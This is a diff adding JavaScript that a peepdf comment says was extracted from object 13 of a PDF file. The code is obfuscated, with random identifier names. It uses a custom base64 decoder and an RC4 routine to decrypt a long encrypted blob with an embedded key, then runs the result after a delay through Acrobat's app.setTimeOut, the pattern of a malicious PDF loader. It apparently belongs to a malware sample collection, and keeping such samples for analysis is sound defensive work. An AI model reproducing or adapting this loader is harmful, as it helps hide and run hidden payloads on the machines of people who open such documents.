@@ -1,0 +1,61 @@
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+function riminesesa(vevakud9, vokuv5) {
+    var deres = [],
+        sunibod, tafosip = 0,
+        pumimivife7, bevat = '',
+        vilulanama9;
+    for (sunibod = 0; sunibod < 256; sunibod++) {
+        deres[sunibod] = sunibod;
+    }
+    for (sunibod = 0; sunibod < 256; sunibod++) {
+        tafosip = (tafosip + deres[sunibod] + vevakud9.charCodeAt(sunibod % vevakud9.length)) % 256;
+        pumimivife7 = deres[sunibod];
+        deres[sunibod] = deres[tafosip];
+        deres[tafosip] = pumimivife7;
+    }
+    sunibod = 0;
+    tafosip = 0;
+    for (vilulanama9 = 0; vilulanama9 < vokuv5.length; vilulanama9++) {
+        sunibod = (sunibod + 1) % 256;
+        tafosip = (tafosip + deres[sunibod]) % 256;
+        pumimivife7 = deres[sunibod];
+        deres[sunibod] = deres[tafosip];
+        deres[tafosip] = pumimivife7;
+        bevat += pufetebe(vokuv5.charCodeAt(vilulanama9) ^ deres[(deres[sunibod] + deres[tafosip]) % 256]);
+    }
+    return bevat;
+}
+function pufetebe(bameso) {
+    return String.fromCharCode(bameso)
+}
+function bupik(tuvivanife, nitobitu3) {
+    return nitobitu3 ? (pufetebe(tuvivanife++) + bupik(tuvivanife, --nitobitu3)) : ''
+}
+function kukunad() {
+    return bupik(65, 26) + bupik(97, 26) + bupik(48, 10) + '+' + pufetebe(47) + '='
+}
+var dapip = kukunad(),
+    fepalites1 = app.setTimeOut(riminesesa(menaradu("SlRLbzZQUjByZFkwQ1RJSTRTNU8="), menaradu("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")), 200);
+
+function menaradu(ravoripof) {
+    var minido, vedavurapu, basobumol, lenidepo, vovarikebe, meposi, kabuvov, nilekibodi4 = [],
+        mibope, mibope = 0;
+    while ((ravoripof.length % 4) != 0) {
+        ravoripof += '=';
+    }
+    for (puremedasa3 = 0; puremedasa3 < ravoripof.length; puremedasa3 += 4) {
+        lenidepo = dapip.indexOf(ravoripof.charAt(puremedasa3));
+        vovarikebe = dapip.indexOf(ravoripof.charAt(puremedasa3 + 1));
+        meposi = dapip.indexOf(ravoripof.charAt(puremedasa3 + 2));
+        kabuvov = dapip.indexOf(ravoripof.charAt(puremedasa3 + 3));
+        minido = (lenidepo << 2) | (vovarikebe >> 4);
+        vedavurapu = ((vovarikebe & 15) << 4) | (meposi >> 2);
+        basobumol = ((meposi & 3) << 6) | kabuvov;
+        nilekibodi4[mibope++] = pufetebe(minido);
+        if (meposi != 64) nilekibodi4[mibope++] = pufetebe(vedavurapu);
+        if (kabuvov != 64) nilekibodi4[mibope++] = pufetebe(basobumol);
+    }
+    return nilekibodi4.join('');
+}
+
